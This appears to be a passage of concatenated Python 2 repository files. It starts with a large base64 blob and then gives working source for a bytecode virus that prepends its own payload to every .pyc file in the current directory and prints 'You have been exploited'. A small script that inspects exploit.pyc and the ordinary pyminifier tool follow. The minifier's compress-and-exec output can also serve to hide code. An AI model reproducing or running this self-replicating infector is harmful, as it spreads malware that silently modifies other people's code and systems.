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'))

   #Load this file and identify the exploit part
   f = open(__file__, 'r')

   #First 8 bytes are magic number and timestamp
   head = f.read(8)

   data = Code.from_code(marshal.loads(f.read()))
   f.close()

   last_line = 1
   for i in xrange(2, len(data.code)):
      if data.code[i][0] == SetLineno:
         #Find last line of code to update the real code appropriately 
         last_line = data.code[i][1]
      if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
         #Found signature at end of exploit
         EXPLOIT_SIZE = i+1
         break

   exploit = data.code[:EXPLOIT_SIZE]

   def infect(f_to_infect):
   
      f = open(f_to_infect, 'r')

      #Magic number and timestamp
      head = f.read(8)

      data = Code.from_code(marshal.loads(f.read()))
      if data.code[1][1] == signature:
         #Code is already infected
         return
   
      print f_to_infect
      f.close()
      lines = []
      for i, op in enumerate(data.code):
         if op[0] == SetLineno:
            #Update line numbers to match with new code
            data.code[i] = (SetLineno, op[1]+last_line)
      
      #Insert exploit
      data.code[:0] = exploit

      newfile = open(f_to_infect, 'w')
      newfile.write(head)
      marshal.dump(data.to_code(), newfile)
      newfile.close()
   for i in glob.glob("./*.pyc"):
      infect(i)

   print "You have been exploited"

signature = "DC9723"

########NEW FILE########
__FILENAME__ = filesize
import marshal, byteplay

f = open('exploit.pyc')
f.read(8)
data = byteplay.Code.from_code(marshal.loads(f.read()))
count = 0
for op, args in data.code:
    if op == byteplay.SetLineno:
        count = args

print count, len(data.code)

########NEW FILE########
__FILENAME__ = minify
## {{{ http://code.activestate.com/recipes/576704/ (r16)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       pyminifier.py
#
#       Copyright 2009 Dan McDougall <YouKnowWho@YouKnowWhat.com>
#
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; Version 3 of the License
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, the license can be downloaded here:
#
#       http://www.gnu.org/licenses/gpl.html

# Meta
__version__ = '1.4.1'
__license__ = "GNU General Public License (GPL) Version 3"
__version_info__ = (1, 4, 1)
__author__ = 'Dan McDougall <YouKnowWho@YouKnowWhat.com>'

"""
**Python Minifier:**  Reduces the size of (minifies) Python code for use on
embedded platforms.

Performs the following:
     - Removes docstrings.
     - Removes comments.
     - Minimizes code indentation.
     - Joins multiline pairs of parentheses, braces, and brackets (and removes extraneous whitespace within).
     - Preserves shebangs and encoding info (e.g. "# -- coding: utf-8 --").

Various examples and edge cases are sprinkled throughout the pyminifier code so
that it can be tested by minifying itself.  The way to test is thus:

.. code-block:: bash

    $ python pyminifier.py pyminifier.py > minified_pyminifier.py
    $ python minified_pyminifier.py pyminifier.py > this_should_be_identical.py
    $ diff minified_pyminifier.py this_should_be_identical.py
    $

If you get an error executing minified_pyminifier.py or
'this_should_be_identical.py' isn't identical to minified_pyminifier.py then
something is broken.
"""

import sys, re, cStringIO, tokenize
from optparse import OptionParser

# Compile our regular expressions for speed
multiline_quoted_string = re.compile(r'(\'\'\'|\"\"\")')
not_quoted_string = re.compile(r'(\".*\'\'\'.*\"|\'.*\"\"\".*\')')
trailing_newlines = re.compile(r'\n\n')
shebang = re.compile('^#\!.*$')
encoding = re.compile(".*coding[:=]\s*([-\w.]+)")
multiline_indicator = re.compile('\\\\(\s*#.*)?\n')
# The above also removes trailing comments: "test = 'blah \ # comment here"

# These aren't used but they're a pretty good reference:
double_quoted_string = re.compile(r'((?<!\\)".*?(?<!\\)")')
single_quoted_string = re.compile(r"((?<!\\)'.*?(?<!\\)')")
single_line_single_quoted_string = re.compile(r"((?<!\\)'''.*?(?<!\\)''')")
single_line_double_quoted_string = re.compile(r"((?<!\\)'''.*?(?<!\\)''')")

def remove_comments_and_docstrings(source):
    """
    Returns 'source' minus comments and docstrings.

    **Note**: Uses Python's built-in tokenize module to great effect.

    Example:

    .. code-block:: python

        def noop(): # This is a comment
            '''
            Does nothing.
            '''
            pass # Don't do anything

    Will become:

    .. code-block:: python

        def noop():
            pass
    """
    io_obj = cStringIO.StringIO(source)
    out = ""
    prev_toktype = tokenize.INDENT
    last_lineno = -1
    last_col = 0
    for tok in tokenize.generate_tokens(io_obj.readline):
        token_type = tok[0]
        token_string = tok[1]
        start_line, start_col = tok[2]
        end_line, end_col = tok[3]
        ltext = tok[4]
        # The following two conditionals preserve indentation.
        # This is necessary because we're not using tokenize.untokenize()
        # (because it spits out code with copious amounts of oddly-placed
        # whitespace).
        if start_line > last_lineno:
            last_col = 0
        if start_col > last_col:
            out += (" " * (start_col - last_col))
        # Remove comments:
        if token_type == tokenize.COMMENT:
            pass
        # This series of conditionals removes docstrings:
        elif token_type == tokenize.STRING:
            if prev_toktype != tokenize.INDENT:
        # This is likely a docstring; double-check we're not inside an operator:
                if prev_toktype != tokenize.NEWLINE:
                    # Note regarding NEWLINE vs NL: The tokenize module
                    # differentiates between newlines that start a new statement
                    # and newlines inside of operators such as parens, brackes,
                    # and curly braces.  Newlines inside of operators are
                    # NEWLINE and newlines that start new code are NL.
                    # Catch whole-module docstrings:
                    if start_col > 0:
                        # Unlabelled indentation means we're inside an operator
                        out += token_string
                    # Note regarding the INDENT token: The tokenize module does
                    # not label indentation inside of an operator (parens,
                    # brackets, and curly braces) as actual indentation.
                    # For example:
                    # def foo():
                    #     "The spaces before this docstring are tokenize.INDENT"
                    #     test = [
                    #         "The spaces before this string do not get a token"
                    #     ]
        else:
            out += token_string
        prev_toktype = token_type
        last_col = end_col
        last_lineno = end_line
    return out

def reduce_operators(source):
    """
    Remove spaces between operators in 'source' and returns the result.

    Example:

    .. code-block:: python

        def foo(foo, bar, blah):
            test = "This is a %s" % foo

    Will become:

    .. code-block:: python

        def foo(foo,bar,blah):
            test="This is a %s"%foo
    """
    io_obj = cStringIO.StringIO(source)
    remove_columns = []
    out = ""
    out_line = ""
    prev_toktype = tokenize.INDENT
    prev_tok = None
    last_lineno = -1
    last_col = 0
    lshift = 1
    for tok in tokenize.generate_tokens(io_obj.readline):
        token_type = tok[0]
        token_string = tok[1]
        start_line, start_col = tok[2]
        end_line, end_col = tok[3]
        ltext = tok[4]
        if start_line > last_lineno:
            last_col = 0
        if start_col > last_col:
            out_line += (" " * (start_col - last_col))
        if token_type == tokenize.OP:
            # Operators that begin a line such as @ or open parens should be
            # left alone
            start_of_line_types = [ # These indicate we're starting a new line
                tokenize.NEWLINE, tokenize.DEDENT, tokenize.INDENT]
            if prev_toktype not in start_of_line_types:
                # This is just a regular operator; remove spaces
                remove_columns.append(start_col) # Before OP
                remove_columns.append(end_col+1) # After OP
        if token_string.endswith('\n'):
            out_line += token_string
            if remove_columns:
                for col in remove_columns:
                    col = col - lshift
                    try:
            # This was really handy for debugging (looks nice, worth saving):
                        #print out_line + (" " * col) + "^"
                        # The above points to the character we're looking at
                        if out_line[col] == " ": # Only if it is a space
                            out_line = out_line[:col] + out_line[col+1:]
                            lshift += 1 # To re-align future changes on this line
                    except IndexError: # Reached and end of line, no biggie
                        pass
            out += out_line
            remove_columns = []
            out_line = ""
            lshift = 1
        else:
            out_line += token_string
        prev_toktype = token_type
        prev_token = tok
        last_col = end_col
        last_lineno = end_line
    # This makes sure to capture the last line if it doesn't end in a newline:
    out += out_line
    # The tokenize module doesn't recognize @ sign before a decorator
    return out

# NOTE: This isn't used anymore...  Just here for reference in case someone
# searches the internet looking for a way to remove similarly-styled end-of-line
# comments from non-python code.  It also acts as an edge case of sorts with
# that raw triple quoted string inside the "quoted_string" assignment.
def remove_comment(single_line):
    """
    Removes the comment at the end of the line (if any) and returns the result.
    """
    quoted_string = re.compile(
        r'''((?<!\\)".*?(?<!\\)")|((?<!\\)'.*?(?<!\\)')'''
    )
    # This divides the line up into sections:
    #   Those inside single quotes and those that are not
    split_line = quoted_string.split(single_line)
    # Remove empty items:
    split_line = [a for a in split_line if a]
    out_line = ""
    for section in split_line:
        if section.startswith("'") or section.startswith('"'):
            # This is a quoted string; leave it alone
            out_line += section
        elif '#' in section: # A '#' not in quotes?  There's a comment here!
            # Get rid of everything after the # including the # itself:
            out_line += section.split('#')[0]
            break # No reason to bother the rest--it's all comments
        else:
            # This isn't a quoted string OR a comment; leave it as-is
            out_line += section
    return out_line.rstrip() # Strip trailing whitespace before returning

def join_multiline_pairs(text, pair="()"):
    """
    Finds and removes newlines in multiline matching pairs of characters in
    'text'.  For example, "(.*\n.*), {.*\n.*}, or [.*\n.*]".

    By default it joins parens () but it will join any two characters given via
    the 'pair' variable.

    **Note:** Doesn't remove extraneous whitespace that ends up between the pair.
    Use reduce_operators() for that.

    Example:

    .. code-block:: python

        test = (
            "This is inside a multi-line pair of parentheses"
        )

    Will become:

    .. code-block:: python

        test = (            "This is inside a multi-line pair of parentheses"        )
    """
    # Readability variables
    opener = pair[0]
    closer = pair[1]

    # Tracking variables
    inside_pair = False
    inside_quotes = False
    inside_double_quotes = False
    inside_single_quotes = False
    quoted_string = False
    openers = 0
    closers = 0
    linecount = 0

    # Regular expressions
    opener_regex = re.compile('\%s' % opener)
    closer_regex = re.compile('\%s' % closer)

    output = ""

    for line in text.split('\n'):
        escaped = False
        # First we rule out multi-line strings
        multline_match = multiline_quoted_string.search(line)
        not_quoted_string_match = not_quoted_string.search(line)
        if multline_match and not not_quoted_string_match and not quoted_string:
            if len(line.split('"""')) > 1 or len(line.split("'''")):
                # This is a single line that uses the triple quotes twice
                # Treat it as if it were just a regular line:
                output += line + '\n'
                quoted_string = False
            else:
                output += line + '\n'
                quoted_string = True
        elif quoted_string and multiline_quoted_string.search(line):
            output += line + '\n'
            quoted_string = False
        # Now let's focus on the lines containing our opener and/or closer:
        elif not quoted_string:
            if opener_regex.search(line) or closer_regex.search(line) or inside_pair:
                for character in line:
                    if character == opener:
                        if not escaped and not inside_quotes:
                            openers += 1
                            inside_pair = True
                            output += character
                        else:
                            escaped = False
                            output += character
                    elif character == closer:
                        if not escaped and not inside_quotes:
                            if openers and openers == (closers + 1):
                                closers = 0
                                openers = 0
                                inside_pair = False
                                output += character
                            else:
                                closers += 1
                                output += character
                        else:
                            escaped = False
                            output += character
                    elif character == '\\':
                        if escaped:
                            escaped = False
                            output += character
                        else:
                            escaped = True
                            output += character
                    elif character == '"' and escaped:
                        output += character
                        escaped = False
                    elif character == "'" and escaped:
                        output += character
                        escaped = False
                    elif character == '"' and inside_quotes:
                        if inside_single_quotes:
                            output += character
                        else:
                            inside_quotes = False
                            inside_double_quotes = False
                            output += character
                    elif character == "'" and inside_quotes:
                        if inside_double_quotes:
                            output += character
                        else:
                            inside_quotes = False
                            inside_single_quotes = False
                            output += character
                    elif character == '"' and not inside_quotes:
                        inside_quotes = True
                        inside_double_quotes = True
                        output += character
                    elif character == "'" and not inside_quotes:
                        inside_quotes = True
                        inside_single_quotes = True
                        output += character
                    elif character == ' ' and inside_pair and not inside_quotes:
                        if not output[-1] in [' ', opener]:
                            output += ' '
                    else:
                        if escaped:
                            escaped = False
                        output += character
                if inside_pair == False:
                    output += '\n'
            else:
                output += line + '\n'
        else:
            output += line + '\n'

    # Clean up
    output = trailing_newlines.sub('\n', output)

    return output

def dedent(source):
    """
    Minimizes indentation to save precious bytes

    Example:

    .. code-block:: python

        def foo(bar):
            test = "This is a test"

    Will become:

    .. code-block:: python

        def foo(bar):
         test = "This is a test"
    """
    io_obj = cStringIO.StringIO(source)
    out = ""
    last_lineno = -1
    last_col = 0
    prev_start_line = 0
    indentation = ""
    indentation_level = 0
    for i,tok in enumerate(tokenize.generate_tokens(io_obj.readline)):
        token_type = tok[0]
        token_string = tok[1]
        start_line, start_col = tok[2]
        end_line, end_col = tok[3]
        if start_line > last_lineno:
            last_col = 0
        if token_type == tokenize.INDENT:
            indentation_level += 1
            continue
        if token_type == tokenize.DEDENT:
            indentation_level -= 1
            continue
        indentation = " " * indentation_level
        if start_line > prev_start_line:
            out += indentation + token_string
        elif start_col > last_col:
            out += " " + token_string
        else:
            out += token_string
        prev_start_line = start_line
        last_col = end_col
        last_lineno = end_line
    return out

def fix_empty_methods(source):
    """
    Appends 'pass' to empty methods/functions (i.e. where there was nothing but
    a docstring before we removed it =).

    Example:

    .. code-block:: python

        # Note: This triple-single-quote inside a triple-double-quote is also a
        # pyminifier self-test
        def myfunc():
            '''This is just a placeholder function.'''

    Will become:

    .. code-block:: python

        def myfunc(): pass
    """
    def_indentation_level = 0
    output = ""
    just_matched = False
    previous_line = None
    method = re.compile(r'^\s*def\s*.*\(.*\):.*$')
    for line in source.split('\n'):
        if len(line.strip()) > 0: # Don't look at blank lines
            if just_matched == True:
                this_indentation_level = len(line.rstrip()) - len(line.strip())
                if def_indentation_level == this_indentation_level:
                    # This method is empty, insert a 'pass' statement
                    output += "%s pass\n%s\n" % (previous_line, line)
                else:
                    output += "%s\n%s\n" % (previous_line, line)
                just_matched = False
            elif method.match(line):
                def_indentation_level = len(line) - len(line.strip()) # A commment
                just_matched = True
                previous_line = line
            else:
                output += "%s\n" % line # Another self-test
        else:
            output += "\n"
    return output

def remove_blank_lines(source):
    """
    Removes blank lines from 'source' and returns the result.

    Example:

    .. code-block:: python

        test = "foo"

        test2 = "bar"

    Will become:

    .. code-block:: python

        test = "foo"
        test2 = "bar"
    """
    io_obj = cStringIO.StringIO(source)
    source = [a for a in io_obj.readlines() if a.strip()]
    return "".join(source)

def minify(source):
    """
    Remove all docstrings, comments, blank lines, and minimize code
    indentation from 'source' then prints the result.
    """
    preserved_shebang = None
    preserved_encoding = None

    # This is for things like shebangs that must be precisely preserved
    for line in source.split('\n')[0:2]:
        # Save the first comment line if it starts with a shebang
        # (e.g. '#!/usr/bin/env python') <--also a self test!
        if shebang.match(line): # Must be first line
            preserved_shebang = line
            continue
        # Save the encoding string (must be first or second line in file)
        if encoding.match(line):
            preserved_encoding = line

    # Remove multilines (e.g. lines that end with '\' followed by a newline)
    source = multiline_indicator.sub('', source)

    # Remove docstrings (Note: Must run before fix_empty_methods())
    source = remove_comments_and_docstrings(source)

    # Remove empty (i.e. single line) methods/functions
    source = fix_empty_methods(source)

    # Join multiline pairs of parens, brackets, and braces
    source = join_multiline_pairs(source)
    source = join_multiline_pairs(source, '[]')
    source = join_multiline_pairs(source, '{}')

    # Remove whitespace between operators:
    source = reduce_operators(source)

    # Minimize indentation
    source = dedent(source)

    # Re-add preseved items
    if preserved_encoding:
        source = preserved_encoding + "\n" + source
    if preserved_shebang:
        source = preserved_shebang + "\n" + source

    # Remove blank lines
    source = remove_blank_lines(source).rstrip('\n') # Stubborn last newline

    return source

def bz2_pack(source):
    "Returns 'source' as a bzip2-compressed, self-extracting python script."
    import bz2, base64
    out = ""
    compressed_source = bz2.compress(source)
    out += 'import bz2, base64\n'
    out += "exec bz2.decompress(base64.b64decode('"
    out += base64.b64encode((compressed_source))
    out += "'))\n"
    return out

def gz_pack(source):
    "Returns 'source' as a gzip-compressed, self-extracting python script."
    import zlib, base64
    out = ""
    compressed_source = zlib.compress(source)
    out += 'import zlib, base64\n'
    out += "exec zlib.decompress(base64.b64decode('"
    out += base64.b64encode((compressed_source))
    out += "'))\n"
    return out

# The test.+() functions below are for testing pyminifer...
def test_decorator(f):
    """Decorator that does nothing"""
    return f

def test_reduce_operators():
    """Test the case where an operator such as an open paren starts a line"""
    (a, b) = 1, 2 # The indentation level should be preserved
    pass

def test_empty_functions():
    """
    This is a test method.
    This should be replaced with 'def empty_method: pass'
    """

class test_class(object):
    "Testing indented decorators"

    @test_decorator
    def foo(self):
        pass

def test_function():
    """
    This function encapsulates the edge cases to prevent them from invading the
    global namespace.
    """
    foo = ("The # character in this string should " # This comment
           "not result in a syntax error") # ...and this one should go away
    test_multi_line_list = [
        'item1',
        'item2',
        'item3'
    ]
    test_multi_line_dict = {
        'item1': 1,
        'item2': 2,
        'item3': 3
    }
    # It may seem strange but the code below tests our docstring removal code.
    test_string_inside_operators = imaginary_function(
        "This string was indented but the tokenizer won't see it that way."
    ) # To understand how this could mess up docstring removal code see the
      # remove_comments_and_docstrings() function starting at this line:
      #     "elif token_type == tokenize.STRING:"
    # This tests remove_extraneous_spaces():
    this_line_has_leading_indentation    = '''<--That extraneous space should be
                                              removed''' # But not these spaces

def main():
    usage = '%prog [options] "<input file>"'
    parser = OptionParser(usage=usage, version=__version__)
    parser.disable_interspersed_args()
    parser.add_option(
        "-o", "--outfile",
        dest="outfile",
        default=None,
        help="Save output to the given file.",
        metavar="<file path>"
    )
    parser.add_option(
        "--bzip2",
        action="store_true",
        dest="bzip2",
        default=False,
        help="bzip2-compress the result into a self-executing python script."
    )
    parser.add_option(
        "--gzip",
        action="store_true",
        dest="gzip",
        default=False,
        help="gzip-compress the result into a self-executing python script."
    )
    options, args = parser.parse_args()
    try:
        source = open(args[0]).read()
    except Exception, e:
        print e
        parser.print_help()
        sys.exit(2)
    # Minify our input script
    result = minify(source)
    # Compress it if we were asked to do so
    if options.bzip2:
        result = bz2_pack(result)
    elif options.gzip:
        result = gz_pack(result)
    # Either save the result to the output file or print it to stdout
    if options.outfile:
        f = open(options.outfile, 'w')
        f.write(result)
        f.close()
    else:
        print result

if __name__ == "__main__":
    main()
## end of http://code.activestate.com/recipes/576704/ }}}

########NEW FILE########
